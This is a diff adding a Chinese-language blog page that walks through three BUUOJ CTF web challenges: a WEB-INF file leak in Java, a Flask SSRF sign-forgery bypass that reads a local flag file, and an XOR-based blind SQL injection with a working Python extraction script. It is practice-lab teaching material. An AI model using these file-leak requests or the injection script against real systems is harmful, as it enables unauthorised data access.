@@ -1,0 +1,542 @@
+<!DOCTYPE html>
+<html 
+	lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		
+<link rel="stylesheet" href="/css/layout.css">
+
+		
+		<title> buu做题记录1 -  clown</title>
+		<link rel="stylesheet" href="https://unpkg.com/mdui@1.0.2/dist/css/mdui.min.css" />
+		<script src="https://unpkg.com/mdui@1.0.2/dist/js/mdui.min.js"></script>
+		<!-- lazyload -->
+		<script src="https://unpkg.com/lazysizes@5.1.0/lazysizes.min.js"></script>
+		<!-- smooth-scrolling -->
+		<script src="https://unpkg.com/smooth-scrolling.js@1.0.0"></script>
+		<!-- highlight -->
+		<link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/atom-one-dark.min.css" />
+		<script src="//unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js"></script>
+		<!-- 预置 kiraicon -->
+		
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css">
+
+		
+		<link
+			rel="shortcut icon"
+			href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			type="image/png"
+		/>
+		
+<link rel="stylesheet" href="/deps/css/APlayer.min.css">
+
+		
+			
+				
+<link rel="stylesheet" href="/style.css">
+
+			
+				
+<link rel="stylesheet" href="/custom.css">
+
+			
+		
+		
+<script src="/deps/js/APlayer.min.js"></script>
+<script src="/deps/js/Meting.min.js"></script>
+
+	<meta name="generator" content="Hexo 7.0.0"></head>
+
+	<body>
+		<div
+			class="kira-background"
+			style="background-image: url('https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png')"
+		></div>
+		<div class="kira-header">
+    <a
+        class="kira-drawer-button mdui-ripple"
+        title="导航栏"
+        onclick="document.querySelector('.kira-sidebar-modal').classList.add('show');document.querySelector('.kira-sidebar#sidebar').classList.add('show');"
+    >
+        <i class="kirafont icon-menu"></i>
+    </a>
+    <a href="/" title="clown">
+        <img
+			src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+			alt="clown"
+		/>
+    </a>
+</div>
+		<div class="kira-body">
+			<div class="kira-sidebar" id="sidebar">
+	<div class="kira-avatar mdui-ripple">
+		<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" title="clown">
+			<img
+				src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg"
+				alt="clown"
+			/>
+		</a>
+	</div>
+	<div class="kira-count">
+		<div><span>文章</span>12</div>
+		<div><span>标签</span>6</div>
+		<div><span>分类</span>6</div>
+	</div>
+	<div class="kira-list">
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/"
+			title="回到首页"
+		>
+			<i
+				class="kirafont
+					
+						icon-home
+					"
+			></i>
+			<div class="kira-list-item-content">
+				回到首页
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/archive.html"
+			title="文章归档"
+		>
+			<i
+				class="kirafont
+					
+						icon-container
+					"
+			></i>
+			<div class="kira-list-item-content">
+				文章归档
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/about.html"
+			title="关于本人"
+		>
+			<i
+				class="kirafont
+					
+						icon-user
+					"
+			></i>
+			<div class="kira-list-item-content">
+				关于本人
+			</div>
+		</a>
+		
+		<a
+			class="kira-list-item mdui-ripple false"
+			href="/friends.html"
+			title="我的朋友"
+		>
+			<i
+				class="kirafont
+					
+						icon-team
+					"
+			></i>
+			<div class="kira-list-item-content">
+				我的朋友
+			</div>
+		</a>
+		
+	</div>
+	<aside id="kira-sidebar">
+		
+			<div class="kira-widget-wrap">
+	<div class="kira-widget kira-social">
+		
+			<a
+				class="mdui-ripple"
+				href="tencent://AddContact/?fromId=45&fromSubId=1&subcmd=all&uin=1056317718&website=www.oicqzone.com"
+				target="_blank"
+				mdui-tooltip="{content: 'QQ'}"
+				style="color: rgb(49, 174, 255); background-color: rgba(49, 174, 255, .1);"
+			>
+				<i
+					class="kirafont
+					
+						icon-QQ
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://space.bilibili.com/378722283"
+				target="_blank"
+				mdui-tooltip="{content: '哔哩哔哩'}"
+				style="color: rgb(231, 106, 141); background-color: rgba(231, 106, 141, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-bilibili
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://github.com/clowsman"
+				target="_blank"
+				mdui-tooltip="{content: 'GitHub'}"
+				style="color: rgb(25, 23, 23); background-color: rgba(25, 23, 23, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-github
+					"
+				></i>
+			</a>
+		
+			<a
+				class="mdui-ripple"
+				href="https://gitee.com/ljc0033"
+				target="_blank"
+				mdui-tooltip="{content: 'Gitee'}"
+				style="color: rgb(165, 15, 15); background-color: rgba(165, 15, 15, .15);"
+			>
+				<i
+					class="kirafont
+					
+						icon-gitee
+					"
+				></i>
+			</a>
+		
+	</div>
+</div>
+
+		
+			
+  <div class="kira-widget-wrap">
+    <h3 class="kira-widget-title">分类</h3>
+    <div class="kira-widget">
+      <ul class="category-list">
+        
+        
+
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/blog/">
+              blog
+            </a>
+            <span class="category-list-count">2</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/git/">
+              git
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/go/">
+              go
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/web/">
+              web
+            </a>
+            <span class="category-list-count">2</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/区块链/">
+              区块链
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+          <li class="category-list-item">
+            <a class="category-list-link" href="/categories/提权/">
+              提权
+            </a>
+            <span class="category-list-count">1</span>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+		
+			
+	<div class="kira-widget-wrap">
+		<div id="randomtagcloud" class="kira-widget tagcloud kira-rainbow">
+			<a href="/tags/CTF-BC/" style="font-size: 10px;">CTF BC</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/ctf-%E5%88%B7%E9%A2%98/" style="font-size: 10px;">ctf 刷题</a> <a href="/tags/go/" style="font-size: 10px;">go</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E5%AD%A6%E4%B9%A0/" style="font-size: 20px;">学习</a>
+		</div>
+		
+	</div>
+
+
+		
+	</aside>
+	<div class="kira-copyright">
+		&copy; 2024
+		<a href="/">clown</a>
+		Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> &
+		<a href="https://github.com/ch1ny/kira-hexo/" target="_blank">Kira-Hexo</a>
+		<br />
+		
+		
+	</div>
+</div>
+<div
+	class="kira-sidebar-modal"
+	id="sidebar-modal"
+	onclick="(function(self) {
+		self.classList.remove('show');
+		document.querySelector('.kira-sidebar.show#sidebar').classList.remove('show');
+	})(this)"
+></div>
+			<div class="kira-content">
+				<div id="kira-top-header"></div>
+				<div class="kira-main-content">
+					
+<link rel="stylesheet" href="/css/kira-image.css">
+
+
+<script src="/js/kira-image.js"></script>
+
+<div class="kira-image">
+    <div class="kira-image-modal">
+        <div class="kira-image-header">
+            <div class="kira-image-counter"></div>
+            <div class="kira-image-title"></div>
+            <div class="kira-image-operation">
+                <div class="kira-image-operation-button" id="kira-image-operation-button-zoom">
+                    <i class="kirafont icon-zoom-in"></i>
+                </div>
+                <div class="kira-image-operation-button" id="kira-image-operation-button-close">
+                    <i class="kirafont icon-close"></i>
+                </div>
+            </div>
+        </div>
+        <div class="kira-image-container">
+            <div class="kira-image-prev-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-left"></i>
+                </div>
+            </div>
+            <div class="kira-image-list">
+                <div class="kira-image-prev">
+                    <img />
+                </div>
+                <div class="kira-image-now">
+                    <img />
+                </div>
+                <div class="kira-image-next">
+                    <img />
+                </div>
+            </div>
+            <div class="kira-image-next-button-panel">
+                <div class="kira-image-exchange-button">
+                    <i class="kirafont icon-right"></i>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<div class="kira-post">
+	<article>
+		
+		<div
+			class="kira-post-cover"
+			style="padding-bottom: '56.25%'"
+		>
+			<img
+				data-src="https://cdn.jsdelivr.net/gh/clowsman/image@1.0/back.png"
+				data-sizes="auto"
+				alt="buu做题记录1"
+				class="lazyload kira-post-cover-image disabled-kira-image"
+			/>
+			<h1>buu做题记录1</h1>
+		</div>
+		
+		<div class="kira-post-meta kira-rainbow" style="margin:10px 0!important;">
+			<a><i class="kirafont icon-calendar-fill"></i>2024年03月02日</a>
+			<a><i class="kirafont icon-edit-fill"></i>2.3k 字</a>
+			<a><i class="kirafont icon-time-circle-fill"></i>大概 11 分钟</a>
+		</div>
+		<h1><span id="roarctf-2019easy-java">[RoarCTF 2019]Easy Java</span></h1><p>题目是一个登陆界面，试了一下admin&#x2F;admin没反应</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113439732.png" alt="image-20240302113439732" class="lazyload"></p>
+<p>点击帮助文档出现一个java语句<strong>java.io.FileNotFoundException:{help.docx}</strong></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113616226.png" alt="image-20240302113616226" class="lazyload"></p>
+<p>应该就是啥都没有，查看源码他的链接是这样的</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302113731820.png" alt="image-20240302113731820" class="lazyload"></p>
+<p>没啥思路去看别的师傅的wp，这里涉及到一个WEB-INF&#x2F;xml的文件泄露，因为这题的环境是java的web应用</p>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/darkcyan/p/17668377.html">https://www.cnblogs.com/darkcyan/p/17668377.html</a></p>
+<p><strong>WEB-INF知识</strong></p>
+<p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
+<p>这是一些主要敏感目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件<br>/WEB-INF/database.properties：数据库配置文件<br></code></pre></td></tr></table></figure>
+
+<p>然后就去下载页面去看这些敏感目录的内容，先去看WEB-INF&#x2F;web.xml</p>
+<p>不过这里的下载页面很奇怪，get请求的时候是下载不了的，改成post就可以了，上面的help文档也是</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302115936170.png" alt="image-20240302115936170" class="lazyload"></p>
+<p>改成post去看一下文件内容</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302120029103.png" alt="image-20240302120029103" class="lazyload"></p>
+<p>这是从别的师傅那找来的相关标签的用法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径<br><br>&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点<br>一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致<br>另一个是&lt;url-pattern&gt;，配置这个组件的访问路径<br><br>&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关<br><br>举个例子<br>&lt;servlet&gt;<br>    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;<br>    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后上面的web.xml文件我们看到了flag相关的类，然后有个路径我试着去访问了一下返回500状态码，那就要去找FlagController.class文件了</p>
+<p>因为WEB-INF&#x2F;classes里面包含了所有class文件，所以我们从该目录开始然后通过包名去写路径即可拿到想要的class文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/Download<br><br>POST:<br>filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240302121422866.png" alt="image-20240302121422866" class="lazyload"></p>
+<p>然后将其中的base64字符串拿去解码即可获得flag</p>
+<h1><span id="de1ctf-2019ssrf-me">[De1CTF 2019]SSRF Me</span></h1><p>题目进去就看到一段很丑陋的源代码，看源码也没有格式化好</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303014938284.png" alt="image-20240303014938284" class="lazyload"></p>
+<p>直接去让gpt给我美化了一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br><br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span> resp<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span>(waf(param)):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.debug = <span class="hljs-literal">False</span><br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>根据题目的提示flag在.&#x2F;flag.txt里面</p>
+<p>审计源码发现param和action是我们可控的参数，在Exec函数里，在通过checkSign()的校验之后，如果cookie中的aciton包含scan就写入文件，如果包含read就读取文件</p>
+<p>这里由于waf过滤了gopher和file，就不能通过param直接传参读文件，不过urllib.urlopen()这个方法有两种方法读取本地文件</p>
+<ul>
+<li>直接写文件名</li>
+<li>利用local_file协议：该协议和file的用法一样，local_file&#x2F;&#x2F;&#x2F;etc&#x2F;passwd，但是也被过滤了</li>
+</ul>
+<p>所以这里在param填文件名写入文件</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303155134761.png" alt="image-20240303155134761" class="lazyload"></p>
+<p>然后我们就要再去将action换成read去读取，不过这里生成的sign就需要自己去构造了，因为&#x2F;geneSign路由默认的action是scan，我们去看一下getSign()函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure>
+
+<p>这里我们不知道secret_key，但是&#x2F;geneSign默认action为scan，想查看文件又一定要read，所以直接后面加个read生成sign即可</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303160239016.png" alt="image-20240303160239016" class="lazyload"></p>
+<p>然后我们给param传一个readsign即可，因为知识检测是否有该关键字</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303161016765.png" alt="image-20240303161016765" class="lazyload"></p>
+<h1><span id="极客大挑战-2019finalsql">[极客大挑战 2019]FinalSQL</span></h1><p>这题进去有个登陆页面</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201649603.png" alt="image-20240303201649603" class="lazyload"></p>
+<p>一开始以为注入点在登陆的地方，因为直接get请求发送用户名和密码，试了一下发现没有，后才发现上面的12345会给url传递id参数</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201828243.png" alt="image-20240303201828243" class="lazyload"></p>
+<p>id传6之后的数字会发生变化，传递数字和字符串时返回的页面不一样</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201948963.png" alt="image-20240303201948963" class="lazyload"></p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303202000621.png" alt="image-20240303202000621" class="lazyload"></p>
+<p>去尝试了一些字符发现被过滤了不想fuzz，去看wp说是^没被过滤，可以用异或来进行盲注，因为题目也有提示说盲注,参考文章：<a target="_blank" rel="noopener" href="https://www.shawroot.cc/1158.html">https://www.shawroot.cc/1158.html</a></p>
+<p>payload的大概思路就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1^(sql语句)<br>//比如爆库的话可以用改语句ord(substr(database(),1,1)&gt;10),这就是判断数据库第一位的ascii码值是否大于10，ord()函数也可以用ascii()函数代替<br>//如果页面回显为ERROR!!!，表示正确，因为1^1=0<br>//如果页面回显为NO! Not this! Click others~~~即id=1时的页面，则错误，因为1^0=1<br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303214756062.png" alt="image-20240303214756062" class="lazyload"></p>
+<p>payload如下：</p>
+<p>爆出库名脚本，这里直接按顺序爆下去不写二分法了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr(database(),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303222137783.png" alt="image-20240303222137783" class="lazyload"></p>
